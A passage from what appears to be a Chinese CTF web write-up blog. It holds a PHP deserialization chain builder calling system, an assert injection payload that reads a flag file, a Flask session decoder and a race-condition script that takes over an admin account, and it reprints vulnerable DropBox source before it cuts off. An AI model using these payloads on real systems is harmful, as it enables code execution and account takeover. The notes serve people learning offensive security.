class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($x)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;pool = $x;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;deferred=<span class="keyword">array</span>(<span class="string">"1"</span> =&gt; <span class="keyword">new</span> CacheItem());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProxyAdapter</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $setInnerItem;</span><br><span class="line">    <span class="keyword">private</span> $poolHash;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;setInnerItem = <span class="string">"system"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;poolHash = <span class="string">"tr1ple"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> TagAwareAdapter(<span class="keyword">new</span> ProxyAdapter());</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure>
<h2 id="jarvisoj-babyphp">jarvisoj babyphp</h2>
<p>关键代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_GET[&apos;page&apos;])) &#123;</span><br><span class="line">	$page = $_GET[&apos;page&apos;];</span><br><span class="line">&#125; else &#123;</span><br><span class="line">	$page = &quot;home&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$file = &quot;templates/&quot; . $page . &quot;.php&quot;;</span><br><span class="line">assert(&quot;strpos(&apos;$file&apos;, &apos;..&apos;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;);</span><br><span class="line">assert(&quot;file_exists(&apos;$file&apos;)&quot;) or die(&quot;That file doesn&apos;t exist!&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>assert和system eval一样都可以执行代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">page=flag&apos;,&apos;..&apos;)==false and system(&apos;cat ./templates/flag.php&apos;);//</span><br></pre></td></tr></table></figure>
<h2 id="hctf-admin">hctf admin</h2>
<p><a href="https://skysec.top/2018/11/12/2018-HCTF-Web-Writeup/#admin" target="_blank" rel="noopener">https://skysec.top/2018/11/12/2018-HCTF-Web-Writeup/#admin</a></p>
<p><a href="https://www.codemonster.cn/2018/11/13/2018-hctf-web-writeup/#admin" target="_blank" rel="noopener">https://www.codemonster.cn/2018/11/13/2018-hctf-web-writeup/#admin</a></p>
<p><a href="https://tmr.js.org/p/3a03e44b/" target="_blank" rel="noopener">https://tmr.js.org/p/3a03e44b/</a></p>
<p>这里只对一些值得学习的脚本做一个记录</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#  https://skysec.top/2018/11/12/2018-HCTF-Web-Writeup/#admin</span></span><br><span class="line"><span class="comment"># 这个脚本用于解码ｆｌａｓｋ中的session</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> session_json_serializer</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decryption</span><span class="params">(payload)</span>:</span></span><br><span class="line">    payload, sig = payload.rsplit(<span class="string">b'.'</span>, <span class="number">1</span>)</span><br><span class="line">    payload, timestamp = payload.rsplit(<span class="string">b'.'</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    decompress = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> payload.startswith(<span class="string">b'.'</span>):</span><br><span class="line">        payload = payload[<span class="number">1</span>:]</span><br><span class="line">        decompress = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'Could not base64 decode the payload because of '</span></span><br><span class="line">                         <span class="string">'an exception'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> decompress:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">'Could not zlib decompress the payload before '</span></span><br><span class="line">                             <span class="string">'decoding the payload'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> session_json_serializer.loads(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print(decryption(sys.argv[<span class="number">1</span>].encode()))</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#  https://skysec.top/2018/11/12/2018-HCTF-Web-Writeup/#admin</span></span><br><span class="line"><span class="comment"># 条件竞争脚本</span></span><br><span class="line"><span class="comment"># 期望的流程为：普通用户登录＼普通用户登出＼普通用户尝试登录ａｄｍｉｎ账户并取得相应session,并在程序验证过期之前触发改密码的流程，此时原来的普通用户已经是ａｄｍｉｎ了</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(s, username, password)</span>:</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'username'</span>: username,</span><br><span class="line">        <span class="string">'password'</span>: password,</span><br><span class="line">        <span class="string">'submit'</span>: <span class="string">''</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s.post(<span class="string">"http://admin.2018.hctf.io/login"</span>, data=data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> s.get(<span class="string">"http://admin.2018.hctf.io/logout"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(s, newpassword)</span>:</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'newpassword'</span>:newpassword</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s.post(<span class="string">"http://admin.2018.hctf.io/change"</span>, data=data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func1</span><span class="params">(s)</span>:</span></span><br><span class="line">    login(s, <span class="string">'skysec'</span>, <span class="string">'skysec'</span>)</span><br><span class="line">    change(s, <span class="string">'skysec'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func2</span><span class="params">(s)</span>:</span></span><br><span class="line">    logout(s)</span><br><span class="line">    res = login(s, <span class="string">'admin'</span>, <span class="string">'skysec'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'&lt;a href="/index"&gt;/index&lt;/a&gt;'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        print(<span class="string">'finish'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>):</span><br><span class="line">        print(i)</span><br><span class="line">        s = requests.Session()</span><br><span class="line">        t1 = threading.Thread(target=func1, args=(s,))</span><br><span class="line">        t2 = threading.Thread(target=func2, args=(s,))</span><br><span class="line">        t1.start()</span><br><span class="line">        t2.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h2 id="2019-CISCN-northern-DropBox">2019 CISCN northern DropBox</h2>
<p><img src="https://user-images.githubusercontent.com/40637063/61511347-040f3f80-aa29-11e9-8846-e8a0e0a769c0.png" alt="1562476128111"></p>
<p>当上传一个文件(只能是jpgpng这些)之后,页面会给我们提供下载和删除功能.</p>
<p><img src="https://user-images.githubusercontent.com/40637063/61511378-2a34df80-aa29-11e9-8268-6c6ccba139cd.png" alt="1562476266190"></p>
<p>那么我们可以把一些源代码 <code>class.php</code> <code>upload.php</code> <code>download.php</code> <code>delete.php</code> and <code>index.php</code> 给下载下来.(need absolutely path)</p>
<p><img src="https://user-images.githubusercontent.com/40637063/61511425-4a649e80-aa29-11e9-8161-9266a5df971b.png" alt="1562476753974"></p>
<p>source code:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">download.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>])) &#123;</span><br><span class="line">    header(<span class="string">"Location: login.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'filename'</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">"class.php"</span>;</span><br><span class="line">ini_set(<span class="string">"open_basedir"</span>, getcwd() . <span class="string">":/etc:/tmp"</span>);</span><br><span class="line"></span><br><span class="line">chdir($_SESSION[<span class="string">'sandbox'</span>]);</span><br><span class="line">$file = <span class="keyword">new</span> File();</span><br><span class="line">$filename = (string) $_POST[<span class="string">'filename'</span>];</span><br><span class="line"><span class="keyword">if</span> (strlen($filename) &lt; <span class="number">40</span> &amp;&amp; $file-&gt;open($filename) &amp;&amp; stristr($filename, <span class="string">"flag"</span>) === <span class="keyword">false</span>) &#123;</span><br><span class="line">    Header(<span class="string">"Content-type: application/octet-stream"</span>);</span><br><span class="line">    Header(<span class="string">"Content-Disposition: attachment; filename="</span> . basename($filename));</span><br><span class="line">    <span class="keyword">echo</span> $file-&gt;close();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"File not exist"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>upload.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>])) &#123;</span><br><span class="line">    header(<span class="string">"Location: login.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">"class.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_FILES[<span class="string">"file"</span>])) &#123;</span><br><span class="line">    $filename = $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">    $pos = strrpos($filename, <span class="string">"."</span>);</span><br><span class="line">    <span class="keyword">if</span> ($pos !== <span class="keyword">false</span>) &#123;</span><br><span class="line">        $filename = substr($filename, <span class="number">0</span>, $pos);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    $fileext = <span class="string">".gif"</span>;</span><br><span class="line">    <span class="keyword">switch</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>]) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'image/gif'</span>:</span><br><span class="line">            $fileext = <span class="string">".gif"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'image/jpeg'</span>:</span><br><span class="line">            $fileext = <span class="string">".jpg"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'image/png'</span>:</span><br><span class="line">            $fileext = <span class="string">".png"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            $response = <span class="keyword">array</span>(<span class="string">"success"</span> =&gt; <span class="keyword">false</span>, <span class="string">"error"</span> =&gt; <span class="string">"Only gif/jpg/png allowed"</span>);</span><br><span class="line">            Header(<span class="string">"Content-type: application/json"</span>);</span><br><span class="line">            <span class="keyword">echo</span> json_encode($response);</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (strlen($filename) &lt; <span class="number">40</span> &amp;&amp; strlen($filename) !== <span class="number">0</span>) &#123;</span><br><span class="line">        $dst = $_SESSION[<span class="string">'sandbox'</span>] . $filename . $fileext;</span><br><span class="line">        move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>], $dst);</span><br><span class="line">        $response = <span class="keyword">array</span>(<span class="string">"success"</span> =&gt; <span class="keyword">true</span>, <span class="string">"error"</span> =&gt; <span class="string">""</span>);</span><br><span class="line">        Header(<span class="string">"Content-type: application/json"</span>);</span><br><span class="line">        <span class="keyword">echo</span> json_encode($response);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $response = <span class="keyword">array</span>(<span class="string">"success"</span> =&gt; <span class="keyword">false</span>, <span class="string">"error"</span> =&gt; <span class="string">"Invaild filename"</span>);</span><br><span class="line">        Header(<span class="string">"Content-type: application/json"</span>);</span><br><span class="line">        <span class="keyword">echo</span> json_encode($response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$dbaddr = <span class="string">"127.0.0.1"</span>;</span><br><span class="line">$dbuser = <span class="string">"root"</span>;</span><br><span class="line">$dbpass = <span class="string">"root"</span>;</span><br><span class="line">$dbname = <span class="string">"dropbox"</span>;</span><br><span class="line">$db = <span class="keyword">new</span> mysqli($dbaddr, $dbuser, $dbpass, $dbname);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $db;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $db;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db = $db;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">user_exist</span><span class="params">($username)</span> </span>&#123;</span><br><span class="line">        $stmt = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">"SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;"</span>);</span><br><span class="line">        $stmt-&gt;bind_param(<span class="string">"s"</span>, $username);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        $stmt-&gt;store_result();</span><br><span class="line">        $count = $stmt-&gt;num_rows;</span><br><span class="line">        <span class="keyword">if</span> ($count === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add_user</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;user_exist($username)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $password = sha1($password . <span class="string">"SiAchGHmFx"</span>);</span><br><span class="line">        $stmt = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">"INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);"</span>);</span><br><span class="line">        $stmt-&gt;bind_param(<span class="string">"ss"</span>, $username, $password);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verify_user</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;user_exist($username)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $password = sha1($password . <span class="string">"SiAchGHmFx"</span>);</span><br><span class="line">        $stmt = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">"SELECT `password` FROM `users` WHERE `username` = ?;"</span>);</span><br><span class="line">        $stmt-&gt;bind_param(<span class="string">"s"</span>, $username);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        $stmt-&gt;bind_result($expect);</span><br><span class="line">        $stmt-&gt;fetch();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($expect) &amp;&amp; $expect === $password) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files;</span><br><span class="line">    <span class="keyword">private</span> $results;</span><br><span class="line">    <span class="keyword">private</span> $funcs;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">        $filenames = scandir($path);</span><br><span class="line"></span><br><span class="line">        $key = array_search(<span class="string">"."</span>, $filenames);</span><br><span class="line">        <span class="keyword">unset</span>($filenames[$key]);</span><br><span class="line">        $key = array_search(<span class="string">".."</span>, $filenames);</span><br><span class="line">        <span class="keyword">unset</span>($filenames[$key]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($filenames <span class="keyword">as</span> $filename) &#123;</span><br><span class="line">            $file = <span class="keyword">new</span> File();</span><br><span class="line">            $file-&gt;open($path . $filename);</span><br><span class="line">            array_push(<span class="keyword">$this</span>-&gt;files, $file);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[$file-&gt;name()] = <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($func, $args)</span> </span>&#123;</span><br><span class="line">        array_push(<span class="keyword">$this</span>-&gt;funcs, $func);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $table = <span class="string">'&lt;div id="container" class="container"&gt;&lt;div class="table-responsive"&gt;&lt;table id="table" class="table table-bordered table-hover sm-font"&gt;'</span>;</span><br><span class="line">        $table .= <span class="string">'&lt;thead&gt;&lt;tr&gt;'</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;funcs <span class="keyword">as</span> $func) &#123;</span><br><span class="line">            $table .= <span class="string">'&lt;th scope="col" class="text-center"&gt;'</span> . htmlentities($func) . <span class="string">'&lt;/th&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $table .= <span class="string">'&lt;th scope="col" class="text-center"&gt;Opt&lt;/th&gt;'</span>;</span><br><span class="line">        $table .= <span class="string">'&lt;/thead&gt;&lt;tbody&gt;'</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;results <span class="keyword">as</span> $filename =&gt; $result) &#123;</span><br><span class="line">            $table .= <span class="string">'&lt;tr&gt;'</span>;</span><br><span class="line">            <span class="keyword">foreach</span> ($result <span class="keyword">as</span> $func =&gt; $value) &#123;</span><br><span class="line">                $table .= <span class="string">'&lt;td class="text-center"&gt;'</span> . htmlentities($value) . <span class="string">'&lt;/td&gt;'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            $table .= <span class="string">'&lt;td class="text-center" filename="'</span> . htmlentities($filename) . <span class="string">'"&gt;&lt;a href="#" class="download"&gt;下载&lt;/a&gt; / &lt;a href="#" class="delete"&gt;删除&lt;/a&gt;&lt;/td&gt;'</span>;</span><br><span class="line">            $table .= <span class="string">'&lt;/tr&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> $table;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span><span class="params">($filename)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = $filename;</span><br><span class="line">        <span class="keyword">if</span> (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">name</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> basename(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">size</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $size = filesize(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        $units = <span class="keyword">array</span>(<span class="string">' B'</span>, <span class="string">' KB'</span>, <span class="string">' MB'</span>, <span class="string">' GB'</span>, <span class="string">' TB'</span>);</span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $size &gt;= <span class="number">1024</span> &amp;&amp; $i &lt; <span class="number">4</span>; $i++) $size /= <span class="number">1024</span>;</span><br><span class="line">        <span class="keyword">return</span> round($size, <span class="number">2</span>).$units[$i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">detele</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        unlink(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>delete.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>])) &#123;</span><br><span class="line">    header(<span class="string">"Location: login.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'filename'</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">"class.php"</span>;</span><br><span class="line"></span><br><span class="line">chdir($_SESSION[<span class="string">'sandbox'</span>]);</span><br><span class="line">$file = <span class="keyword">new</span> File();</span><br><span class="line">$filename = (string) $_POST[<span class="string">'filename'</span>];</span><br><span class="line"><span class="keyword">if</span> (strlen($filename) &lt; <span class="number">40</span> &amp;&amp; $file-&gt;open($filename)) &#123;</span><br><span class="line">    $file-&gt;detele();</span><br><span class="line">    Header(<span class="string">"Content-type: application/json"</span>);</span><br><span class="line">    $response = <span class="keyword">array</span>(<span class="string">"success"</span> =&gt; <span class="keyword">true</span>, <span class="string">"error"</span> =&gt; <span class="string">""</span>);</span><br><span class="line">    <span class="keyword">echo</span> json_encode($response);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    Header(<span class="string">"Content-type: application/json"</span>);</span><br><span class="line">    $response = <span class="keyword">array</span>(<span class="string">"success"</span> =&gt; <span class="keyword">false</span>, <span class="string">"error"</span> =&gt; <span class="string">"File not exist"</span>);</span><br><span class="line">    <span class="keyword">echo</span> json_encode($response);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>])) &#123;</span><br><span class="line">    header(<span class="string">"Location: login.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">&lt;meta name=<span class="string">"viewport"</span> content=<span class="string">"width=device-width, initial-scale=1, shrink-to-fit=no"</span>&gt;</span><br><span class="line">&lt;title&gt;网盘管理&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;link href=<span class="string">"static/css/bootstrap.min.css"</span> rel=<span class="string">"stylesheet"</span>&gt;</span><br><span class="line">    &lt;link href=<span class="string">"static/css/panel.css"</span> rel=<span class="string">"stylesheet"</span>&gt;</span><br><span class="line">    &lt;script src=<span class="string">"static/js/jquery.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">"static/js/bootstrap.bundle.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">"static/js/toast.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">"static/js/panel.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;nav aria-label=<span class="string">"breadcrumb"</span>&gt;</span><br><span class="line">    &lt;ol class="breadcrumb"&gt;</span><br><span class="line">        &lt;li class="breadcrumb-item active"&gt;管理面板&lt;/li&gt;</span><br><span class="line">        &lt;li class="breadcrumb-item active"&gt;&lt;label for="fileInput" class="fileLabel"&gt;上传文件&lt;/label&gt;&lt;/li&gt;</span><br><span class="line">        &lt;li class="active ml-auto"&gt;&lt;a href="#"&gt;你好 &lt;?php echo $_SESSION['username']?&gt;&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">    &lt;/ol&gt;</span><br><span class="line">&lt;/nav&gt;</span><br><span class="line">&lt;input type="file" id="fileInput" class="hidden"&gt;</span><br><span class="line">&lt;div class="top" id="toast-container"&gt;&lt;/div&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"class.php"</span>;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> FileList($_SESSION[<span class="string">'sandbox'</span>]);</span><br><span class="line">$a-&gt;Name();</span><br><span class="line">$a-&gt;Size();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>in phar files , meta data was stored in serialized form, which affect many</p>
